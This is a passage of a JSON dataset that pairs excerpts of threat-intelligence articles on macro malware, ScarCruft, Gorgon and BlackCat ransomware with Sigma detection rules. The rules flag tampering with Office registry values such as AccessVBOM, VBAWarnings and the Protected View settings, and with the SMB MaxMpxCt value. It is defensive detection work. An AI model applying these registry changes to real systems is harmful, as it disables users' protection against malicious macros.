    "markdown": "# Post Feb 17, 2022 1\\ How to prove malicious macro was enabled & clicked? 👀 #DFIR HKEY_LOCAL_MACHINE\\USERDAT\\Software\\Microsoft\\Office\\<VERS>\\<PROGRAM>\\Security\\Trusted Documents\\TrustRecords Look ONLY for values where last four bytes are \"FF FF FF 7F\". These files had macros enabled 👇👇👇 ```image Description: The image shows a screenshot of the Windows Registry Editor, specifically focusing on the path related to Microsoft Office's security settings for trusted documents. It highlights the 'TrustRecords' section, with various registry entries displayed. The relevant entries are marked with red boxes, indicating that the last four bytes of certain values are 'FF FF FF 7F', which signifies that macros",
    "sigma_rule": {
      "title": "Trust Access Disable For VBApplications",
      "id": "1a5c46e9-f32f-42f7-b2bc-6e9084db7fbf",
      "related": [
        {
          "id": "a166f74e-bf44-409d-b9ba-ea4b2dd8b3cd",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects registry changes to Microsoft Office \"AccessVBOM\" to a value of \"1\" which disables trust access for VBA on the victim machine and lets attackers execute malicious macros without any Microsoft Office warnings.",
      "references": [
        "https://twitter.com/inversecos/status/1494174785621819397",
        "https://www.mcafee.com/blogs/other-blogs/mcafee-labs/zloader-with-a-new-infection-technique/",
        "https://securelist.com/scarcruft-surveilling-north-korean-defectors-and-human-rights-activists/105074/"
      ],
      "author": "Trent Liffick (@tliffick), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2020-05-22",
      "modified": "2023-08-17",
      "tags": [
        "attack.defense-evasion",
        "attack.t1112"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\Security\\AccessVBOM",
          "Details": "DWORD (0x00000001)"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_office_access_vbom_tamper.yml"
  },
  "974": {
    "url": "https://www.mcafee.com/blogs/other-blogs/mcafee-labs/zloader-with-a-new-infection-technique/",
    "markdown": "# Zloader With a New Infection Technique **Date:** Jul 08, 2021 ## Introduction In the last few years, Microsoft Office macro malware using social engineering as a means for malware infection has been a dominant part of the threat landscape. Malware authors continue to evolve their techniques to evade detection. These techniques involve utilizing macro obfuscation, DDE, living off the land tools (LOLBAS), and even utilizing legacy supported XLS formats. McAfee Labs has discovered a new technique that downloads and executes malicious DLLs (Zloader) without any malicious code present in the initial spammed attachment macro. The objective of this blog",
    "sigma_rule": {
      "title": "Trust Access Disable For VBApplications",
      "id": "1a5c46e9-f32f-42f7-b2bc-6e9084db7fbf",
      "related": [
        {
          "id": "a166f74e-bf44-409d-b9ba-ea4b2dd8b3cd",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects registry changes to Microsoft Office \"AccessVBOM\" to a value of \"1\" which disables trust access for VBA on the victim machine and lets attackers execute malicious macros without any Microsoft Office warnings.",
      "references": [
        "https://twitter.com/inversecos/status/1494174785621819397",
        "https://www.mcafee.com/blogs/other-blogs/mcafee-labs/zloader-with-a-new-infection-technique/",
        "https://securelist.com/scarcruft-surveilling-north-korean-defectors-and-human-rights-activists/105074/"
      ],
      "author": "Trent Liffick (@tliffick), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2020-05-22",
      "modified": "2023-08-17",
      "tags": [
        "attack.defense-evasion",
        "attack.t1112"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\Security\\AccessVBOM",
          "Details": "DWORD (0x00000001)"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_office_access_vbom_tamper.yml"
  },
  "975": {
    "url": "https://securelist.com/scarcruft-surveilling-north-korean-defectors-and-human-rights-activists/105074/",
    "markdown": "# ScarCruft surveilling North Korean defectors and human rights activists **APT reports** **29 Nov 2021** The ScarCruft group (also known as APT37 or Temp.Reaper) is a nation-state sponsored APT actor we first reported in 2016. ScarCruft is known to target North Korean defectors, journalists who cover North Korea-related news, and government organizations related to the Korean Peninsula, among others. Recently, we were approached by a news organization with a request for technical assistance during their cybersecurity investigations. As a result, we had an opportunity to perform a deeper investigation on a host compromised by ScarCruft. The victim was infected by",
    "sigma_rule": {
      "title": "Trust Access Disable For VBApplications",
      "id": "1a5c46e9-f32f-42f7-b2bc-6e9084db7fbf",
      "related": [
        {
          "id": "a166f74e-bf44-409d-b9ba-ea4b2dd8b3cd",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects registry changes to Microsoft Office \"AccessVBOM\" to a value of \"1\" which disables trust access for VBA on the victim machine and lets attackers execute malicious macros without any Microsoft Office warnings.",
      "references": [
        "https://twitter.com/inversecos/status/1494174785621819397",
        "https://www.mcafee.com/blogs/other-blogs/mcafee-labs/zloader-with-a-new-infection-technique/",
        "https://securelist.com/scarcruft-surveilling-north-korean-defectors-and-human-rights-activists/105074/"
      ],
      "author": "Trent Liffick (@tliffick), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2020-05-22",
      "modified": "2023-08-17",
      "tags": [
        "attack.defense-evasion",
        "attack.t1112"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\Security\\AccessVBOM",
          "Details": "DWORD (0x00000001)"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_office_access_vbom_tamper.yml"
  },
  "976": {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md",
    "markdown": "",
    "sigma_rule": {
      "title": "Microsoft Office Protected View Disabled",
      "id": "a5c7a43f-6009-4a8c-80c5-32abf1c53ecc",
      "related": [
        {
          "id": "7c637634-c95d-4bbf-b26c-a82510874b34",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects changes to Microsoft Office protected view registry keys with which the attacker disables this feature.",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md",
        "https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/",
        "https://yoroi.company/research/cyber-criminal-espionage-operation-insists-on-italian-manufacturing/",
        "https://admx.help/HKCU/software/policies/microsoft/office/16.0/excel/security/protectedview"
      ],
      "author": "frack113, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2021-06-08",
      "modified": "2023-08-17",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_set"
      },
      "detection": {
        "selection_path": {
          "TargetObject|contains|all": [
            "\\SOFTWARE\\Microsoft\\Office\\",
            "\\Security\\ProtectedView\\"
          ]
        },
        "selection_values_1": {
          "Details": "DWORD (0x00000001)",
          "TargetObject|endswith": [
            "\\DisableAttachementsInPV",
            "\\DisableInternetFilesInPV",
            "\\DisableIntranetCheck",
            "\\DisableUnsafeLocationsInPV"
          ]
        },
        "selection_values_0": {
          "Details": "DWORD (0x00000000)",
          "TargetObject|endswith": [
            "\\enabledatabasefileprotectedview",
            "\\enableforeigntextfileprotectedview"
          ]
        },
        "condition": "selection_path and 1 of selection_values_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_office_disable_protected_view_features.yml"
  },
  "977": {
    "url": "https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/",
    "markdown": "# The Gorgon Group: Slithering Between Nation State and Cybercrime **Vulnerabilities** ## Related Products - Advanced WildFire - Cortex XDR --- **Published:** August 2, 2018 **Categories:** - Malware - Threat Actor Groups - Threat Research - Vulnerabilities **Tags:** - CVE-2017-0199 - Gorgon Group - Subaat --- Unit 42 researchers have been tracking Subaat, an attacker, since 2017. Recently Subaat drew our attention due to renewed targeted attack activity. Part of monitoring Subaat included realizing the actor was possibly part of a larger crew of individuals responsible for carrying out targeted attacks against worldwide governmental organizations. Technical analysis on some of",
    "sigma_rule": {
      "title": "Microsoft Office Protected View Disabled",
      "id": "a5c7a43f-6009-4a8c-80c5-32abf1c53ecc",
      "related": [
        {
          "id": "7c637634-c95d-4bbf-b26c-a82510874b34",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects changes to Microsoft Office protected view registry keys with which the attacker disables this feature.",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md",
        "https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/",
        "https://yoroi.company/research/cyber-criminal-espionage-operation-insists-on-italian-manufacturing/",
        "https://admx.help/HKCU/software/policies/microsoft/office/16.0/excel/security/protectedview"
      ],
      "author": "frack113, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2021-06-08",
      "modified": "2023-08-17",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_set"
      },
      "detection": {
        "selection_path": {
          "TargetObject|contains|all": [
            "\\SOFTWARE\\Microsoft\\Office\\",
            "\\Security\\ProtectedView\\"
          ]
        },
        "selection_values_1": {
          "Details": "DWORD (0x00000001)",
          "TargetObject|endswith": [
            "\\DisableAttachementsInPV",
            "\\DisableInternetFilesInPV",
            "\\DisableIntranetCheck",
            "\\DisableUnsafeLocationsInPV"
          ]
        },
        "selection_values_0": {
          "Details": "DWORD (0x00000000)",
          "TargetObject|endswith": [
            "\\enabledatabasefileprotectedview",
            "\\enableforeigntextfileprotectedview"
          ]
        },
        "condition": "selection_path and 1 of selection_values_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_office_disable_protected_view_features.yml"
  },
  "978": {
    "url": "https://yoroi.company/research/cyber-criminal-espionage-operation-insists-on-italian-manufacturing/",
    "markdown": "# Cyber-Criminal Espionage Operation Insists on Italian Manufacturing **Date:** 05/22/2020 ## Introduction During our Cyber Threat Intelligence monitoring, we spotted new malicious activities targeting some Italian companies operating worldwide in the manufacturing sector, some of them also part of the automotive production chain. The group behind this activity is the same we identified in the past malicious operations described in Roma225 (12/2018), Hagga (08/2019), Mana (09/2019), YAKKA (01/2020). This actor was first spotted by PaloAlto’s UNIT42 in 2018 during wide scale operations against technology, retail, manufacturing, and local government industries in the US, Europe, and Asia. They also stated the",
    "sigma_rule": {
      "title": "Microsoft Office Protected View Disabled",
      "id": "a5c7a43f-6009-4a8c-80c5-32abf1c53ecc",
      "related": [
        {
          "id": "7c637634-c95d-4bbf-b26c-a82510874b34",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects changes to Microsoft Office protected view registry keys with which the attacker disables this feature.",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md",
        "https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/",
        "https://yoroi.company/research/cyber-criminal-espionage-operation-insists-on-italian-manufacturing/",
        "https://admx.help/HKCU/software/policies/microsoft/office/16.0/excel/security/protectedview"
      ],
      "author": "frack113, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2021-06-08",
      "modified": "2023-08-17",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_set"
      },
      "detection": {
        "selection_path": {
          "TargetObject|contains|all": [
            "\\SOFTWARE\\Microsoft\\Office\\",
            "\\Security\\ProtectedView\\"
          ]
        },
        "selection_values_1": {
          "Details": "DWORD (0x00000001)",
          "TargetObject|endswith": [
            "\\DisableAttachementsInPV",
            "\\DisableInternetFilesInPV",
            "\\DisableIntranetCheck",
            "\\DisableUnsafeLocationsInPV"
          ]
        },
        "selection_values_0": {
          "Details": "DWORD (0x00000000)",
          "TargetObject|endswith": [
            "\\enabledatabasefileprotectedview",
            "\\enableforeigntextfileprotectedview"
          ]
        },
        "condition": "selection_path and 1 of selection_values_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_office_disable_protected_view_features.yml"
  },
  "979": {
    "url": "https://admx.help/HKCU/software/policies/microsoft/office/16.0/excel/security/protectedview",
    "markdown": "# HKEY_CURRENT_USER\\software\\policies\\microsoft\\office\\16.0\\excel\\security\\protectedview - Always open untrusted database files in Protected View - HKEY_CURRENT_USER\\software\\policies\\microsoft\\office\\16.0\\excel\\security\\protectedview\\enabledatabasefileprotectedview - Always open untrusted text-based files in Protected View - HKEY_CURRENT_USER\\software\\policies\\microsoft\\office\\16.0\\excel\\security\\protectedview\\enableforeigntextfileprotectedview - Turn off Protected View for attachments opened from Outlook - HKEY_CURRENT_USER\\software\\policies\\microsoft\\office\\16.0\\excel\\security\\protectedview\\disableattachmentsinpv - Do not open files from the internet zone in Protected View - HKEY_CURRENT_USER\\software\\policies\\microsoft\\office\\16.0\\excel\\security\\protectedview\\disableinternetfilesinpv - Do not open files in unsafe locations in Protected View - HKEY_CURRENT_USER\\software\\policies\\microsoft\\office\\16.0\\excel\\security\\protectedview\\disableunsafelocationsinpv - Open files on local Intranet UNC in Protected View - HKEY_CURRENT_USER\\software\\policies\\microsoft\\office\\16.0\\excel\\security\\protectedview\\disableintranetcheck",
    "sigma_rule": {
      "title": "Microsoft Office Protected View Disabled",
      "id": "a5c7a43f-6009-4a8c-80c5-32abf1c53ecc",
      "related": [
        {
          "id": "7c637634-c95d-4bbf-b26c-a82510874b34",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects changes to Microsoft Office protected view registry keys with which the attacker disables this feature.",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md",
        "https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/",
        "https://yoroi.company/research/cyber-criminal-espionage-operation-insists-on-italian-manufacturing/",
        "https://admx.help/HKCU/software/policies/microsoft/office/16.0/excel/security/protectedview"
      ],
      "author": "frack113, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2021-06-08",
      "modified": "2023-08-17",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_set"
      },
      "detection": {
        "selection_path": {
          "TargetObject|contains|all": [
            "\\SOFTWARE\\Microsoft\\Office\\",
            "\\Security\\ProtectedView\\"
          ]
        },
        "selection_values_1": {
          "Details": "DWORD (0x00000001)",
          "TargetObject|endswith": [
            "\\DisableAttachementsInPV",
            "\\DisableInternetFilesInPV",
            "\\DisableIntranetCheck",
            "\\DisableUnsafeLocationsInPV"
          ]
        },
        "selection_values_0": {
          "Details": "DWORD (0x00000000)",
          "TargetObject|endswith": [
            "\\enabledatabasefileprotectedview",
            "\\enableforeigntextfileprotectedview"
          ]
        },
        "condition": "selection_path and 1 of selection_values_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_office_disable_protected_view_features.yml"
  },
  "980": {
    "url": "https://twitter.com/inversecos/status/1494174785621819397",
    "markdown": "# Post Feb 17, 2022 1\\ How to prove malicious macro was enabled & clicked? 👀 #DFIR HKEY_LOCAL_MACHINE\\USERDAT\\Software\\Microsoft\\Office\\<VERS>\\<PROGRAM>\\Security\\Trusted Documents\\TrustRecords Look ONLY for values where last four bytes are \"FF FF FF 7F\". These files had macros enabled 👇👇👇 ```image Description: The image shows a screenshot of the Windows Registry Editor, specifically focusing on the path related to Microsoft Office's security settings for trusted documents. It highlights the 'TrustRecords' section, with various registry entries displayed. The relevant entries are marked with red boxes, indicating that the last four bytes of certain values are 'FF FF FF 7F', which signifies that macros",
    "sigma_rule": {
      "title": "Office Macros Warning Disabled",
      "id": "91239011-fe3c-4b54-9f24-15c86bb65913",
      "related": [
        {
          "id": "a166f74e-bf44-409d-b9ba-ea4b2dd8b3cd",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects registry changes to Microsoft Office \"VBAWarning\" to a value of \"1\" which enables the execution of all macros, whether signed or unsigned.",
      "references": [
        "https://twitter.com/inversecos/status/1494174785621819397",
        "https://www.mcafee.com/blogs/other-blogs/mcafee-labs/zloader-with-a-new-infection-technique/",
        "https://securelist.com/scarcruft-surveilling-north-korean-defectors-and-human-rights-activists/105074/"
      ],
      "author": "Trent Liffick (@tliffick), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2020-05-22",
      "modified": "2024-03-19",
      "tags": [
        "attack.defense-evasion",
        "attack.t1112"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\Security\\VBAWarnings",
          "Details": "DWORD (0x00000001)"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_office_vba_warnings_tamper.yml"
  },
  "981": {
    "url": "https://www.mcafee.com/blogs/other-blogs/mcafee-labs/zloader-with-a-new-infection-technique/",
    "markdown": "# Zloader With a New Infection Technique **Date:** Jul 08, 2021 ## Introduction In the last few years, Microsoft Office macro malware using social engineering as a means for malware infection has been a dominant part of the threat landscape. Malware authors continue to evolve their techniques to evade detection. These techniques involve utilizing macro obfuscation, DDE, living off the land tools (LOLBAS), and even utilizing legacy supported XLS formats. McAfee Labs has discovered a new technique that downloads and executes malicious DLLs (Zloader) without any malicious code present in the initial spammed attachment macro. The objective of this blog",
    "sigma_rule": {
      "title": "Office Macros Warning Disabled",
      "id": "91239011-fe3c-4b54-9f24-15c86bb65913",
      "related": [
        {
          "id": "a166f74e-bf44-409d-b9ba-ea4b2dd8b3cd",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects registry changes to Microsoft Office \"VBAWarning\" to a value of \"1\" which enables the execution of all macros, whether signed or unsigned.",
      "references": [
        "https://twitter.com/inversecos/status/1494174785621819397",
        "https://www.mcafee.com/blogs/other-blogs/mcafee-labs/zloader-with-a-new-infection-technique/",
        "https://securelist.com/scarcruft-surveilling-north-korean-defectors-and-human-rights-activists/105074/"
      ],
      "author": "Trent Liffick (@tliffick), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2020-05-22",
      "modified": "2024-03-19",
      "tags": [
        "attack.defense-evasion",
        "attack.t1112"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\Security\\VBAWarnings",
          "Details": "DWORD (0x00000001)"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_office_vba_warnings_tamper.yml"
  },
  "982": {
    "url": "https://securelist.com/scarcruft-surveilling-north-korean-defectors-and-human-rights-activists/105074/",
    "markdown": "# ScarCruft surveilling North Korean defectors and human rights activists **APT reports** **29 Nov 2021** The ScarCruft group (also known as APT37 or Temp.Reaper) is a nation-state sponsored APT actor we first reported in 2016. ScarCruft is known to target North Korean defectors, journalists who cover North Korea-related news, and government organizations related to the Korean Peninsula, among others. Recently, we were approached by a news organization with a request for technical assistance during their cybersecurity investigations. As a result, we had an opportunity to perform a deeper investigation on a host compromised by ScarCruft. The victim was infected by",
    "sigma_rule": {
      "title": "Office Macros Warning Disabled",
      "id": "91239011-fe3c-4b54-9f24-15c86bb65913",
      "related": [
        {
          "id": "a166f74e-bf44-409d-b9ba-ea4b2dd8b3cd",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects registry changes to Microsoft Office \"VBAWarning\" to a value of \"1\" which enables the execution of all macros, whether signed or unsigned.",
      "references": [
        "https://twitter.com/inversecos/status/1494174785621819397",
        "https://www.mcafee.com/blogs/other-blogs/mcafee-labs/zloader-with-a-new-infection-technique/",
        "https://securelist.com/scarcruft-surveilling-north-korean-defectors-and-human-rights-activists/105074/"
      ],
      "author": "Trent Liffick (@tliffick), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2020-05-22",
      "modified": "2024-03-19",
      "tags": [
        "attack.defense-evasion",
        "attack.t1112"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\Security\\VBAWarnings",
          "Details": "DWORD (0x00000001)"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_office_vba_warnings_tamper.yml"
  },
  "983": {
    "url": "https://www.huntress.com/blog/blackcat-ransomware-affiliate-ttps",
    "markdown": "# BlackCat Ransomware Affiliate TTPs **February 28, 2024** ## Background On December 19, 2023, the Justice Department Office of Public Affairs issued a press release indicating that the FBI had “disrupted the ALPHV/BlackCat ransomware variant.” This variant of ransomware is offered to affiliates as “ransomware-as-a-service” (RaaS). The FBI also developed a decryption tool that was made available to organizations impacted by this RaaS variant, in an effort to help them recover and resume business operations. On February 19, 2024, ConnectWise published a security advisory for ScreenConnect version 23.9.8, referencing two vulnerabilities and software weaknesses. Two days later, on February 21,",
    "sigma_rule": {
      "title": "MaxMpxCt Registry Value Changed",
      "id": "0e6a9e62-627e-496c-aef5-bfa39da29b5e",
      "status": "test",
      "description": "Detects changes to the \"MaxMpxCt\" registry value.\nMaxMpxCt specifies the maximum outstanding network requests for the server per client, which is used when negotiating a Server Message Block (SMB) connection with a client. Note if the value is set beyond 125 older Windows 9x clients will fail to negotiate.\nRansomware threat actors and operators (specifically BlackCat) were seen increasing this value in order to handle a higher volume of traffic.\n",
      "references": [
        "https://www.huntress.com/blog/blackcat-ransomware-affiliate-ttps",
        "https://securityscorecard.com/research/deep-dive-into-alphv-blackcat-ransomware",
        "https://www.intrinsec.com/alphv-ransomware-gang-analysis/?cn-reloaded=1",
        "https://www.sentinelone.com/labs/blackcat-ransomware-highly-configurable-rust-driven-raas-on-the-prowl-for-victims/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2024-03-19",
      "tags": [
        "attack.defense-evasion",
        "attack.t1070.005"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\Services\\LanmanServer\\Parameters\\MaxMpxCt"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_optimize_file_sharing_network.yml"
  },
  "984": {
    "url": "https://securityscorecard.com/research/deep-dive-into-alphv-blackcat-ransomware",
    "markdown": "# A Deep Dive Into ALPHV/BlackCat Ransomware ## Executive summary ALPHV/BlackCat is the first widely known ransomware written in Rust. The malware must run with an access token consisting of a 32-byte value (`–access-token` parameter), and other parameters can be specified. The ransomware comes with an encrypted configuration that contains: - A list of services/processes to be stopped. - A list of whitelisted directories/files/file extensions. - A list of stolen credentials from the victim environment. It deletes all Volume Shadow Copies, performs privilege escalation using the CMSTPLUA COM interface, and enables “remote to local” and “remote to remote” symbolic links",
    "sigma_rule": {
      "title": "MaxMpxCt Registry Value Changed",
      "id": "0e6a9e62-627e-496c-aef5-bfa39da29b5e",
      "status": "test",
      "description": "Detects changes to the \"MaxMpxCt\" registry value.\nMaxMpxCt specifies the maximum outstanding network requests for the server per client, which is used when negotiating a Server Message Block (SMB) connection with a client. Note if the value is set beyond 125 older Windows 9x clients will fail to negotiate.\nRansomware threat actors and operators (specifically BlackCat) were seen increasing this value in order to handle a higher volume of traffic.\n",
      "references": [
        "https://www.huntress.com/blog/blackcat-ransomware-affiliate-ttps",
        "https://securityscorecard.com/research/deep-dive-into-alphv-blackcat-ransomware",
        "https://www.intrinsec.com/alphv-ransomware-gang-analysis/?cn-reloaded=1",
        "https://www.sentinelone.com/labs/blackcat-ransomware-highly-configurable-rust-driven-raas-on-the-prowl-for-victims/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2024-03-19",
      "tags": [
        "attack.defense-evasion",
        "attack.t1070.005"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\Services\\LanmanServer\\Parameters\\MaxMpxCt"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_optimize_file_sharing_network.yml"
  },
  "985": {
    "url": "https://www.intrinsec.com/alphv-ransomware-gang-analysis/?cn-reloaded=1",
    "markdown": "# ALPHV ransomware gang analysis Jan 26, 2022 **ALPHV** (or **BlackCat or Noberus**) **ransomware** emerged only **last December** and is already considered as a **genuine threat** that blue teams should be ready to fight against while little is known on the employed entry vector(s). This conjecture relies not only on the **high level of developing skills** required to build such **peculiar ransomware payloads and dedicated leak sites** but also more **resilient and secure architecture**; the number of high-profile victims is already growing **at a fast pace** and could keep switching between **big and mid game hunting** in the coming months/years.",
    "sigma_rule": {
      "title": "MaxMpxCt Registry Value Changed",
      "id": "0e6a9e62-627e-496c-aef5-bfa39da29b5e",
      "status": "test",
      "description": "Detects changes to the \"MaxMpxCt\" registry value.\nMaxMpxCt specifies the maximum outstanding network requests for the server per client, which is used when negotiating a Server Message Block (SMB) connection with a client. Note if the value is set beyond 125 older Windows 9x clients will fail to negotiate.\nRansomware threat actors and operators (specifically BlackCat) were seen increasing this value in order to handle a higher volume of traffic.\n",
      "references": [
        "https://www.huntress.com/blog/blackcat-ransomware-affiliate-ttps",
        "https://securityscorecard.com/research/deep-dive-into-alphv-blackcat-ransomware",
        "https://www.intrinsec.com/alphv-ransomware-gang-analysis/?cn-reloaded=1",
        "https://www.sentinelone.com/labs/blackcat-ransomware-highly-configurable-rust-driven-raas-on-the-prowl-for-victims/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2024-03-19",
      "tags": [
        "attack.defense-evasion",
        "attack.t1070.005"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\Services\\LanmanServer\\Parameters\\MaxMpxCt"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_optimize_file_sharing_network.yml"
  },
  "986": {
    "url": "https://www.sentinelone.com/labs/blackcat-ransomware-highly-configurable-rust-driven-raas-on-the-prowl-for-victims/",
    "markdown": "# BlackCat Ransomware | Highly-Configurable, Rust-Driven RaaS On The Prowl For Victims **Date:** January 18, 2022 BlackCat (aka AlphaVM, AlphaV) is a newly established RaaS (Ransomware as a Service) with payloads written in Rust. While BlackCat is not the first ransomware written in the Rust language, it joins a small (yet growing) sliver of the malware landscape making use of this popular cross-platform language. First appearing in late November, BlackCat has reportedly been attacking targets in multiple countries, including Australia, India and the U.S, and demanding ransoms in the region of $400,000 to $3,000,000 in Bitcoin or Monero. ## BlackCat",
    "sigma_rule": {
      "title": "MaxMpxCt Registry Value Changed",
      "id": "0e6a9e62-627e-496c-aef5-bfa39da29b5e",
      "status": "test",
      "description": "Detects changes to the \"MaxMpxCt\" registry value.\nMaxMpxCt specifies the maximum outstanding network requests for the server per client, which is used when negotiating a Server Message Block (SMB) connection with a client. Note if the value is set beyond 125 older Windows 9x clients will fail to negotiate.\nRansomware threat actors and operators (specifically BlackCat) were seen increasing this value in order to handle a higher volume of traffic.\n",
      "references": [
        "https://www.huntress.com/blog/blackcat-ransomware-affiliate-ttps",
        "https://securityscorecard.com/research/deep-dive-into-alphv-blackcat-ransomware",
        "https://www.intrinsec.com/alphv-ransomware-gang-analysis/?cn-reloaded=1",
        "https://www.sentinelone.com/labs/blackcat-ransomware-highly-configurable-rust-driven-raas-on-the-prowl-for-victims/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2024-03-19",
      "tags": [
        "attack.defense-evasion",
        "attack.t1070.005"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\Services\\LanmanServer\\Parameters\\MaxMpxCt"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_optimize_file_sharing_network.yml"
  },
  "987": {
    "url": "https://www.hexacorn.com/blog/2013/01/19/beyond-good-ol-run-key-part-3/",
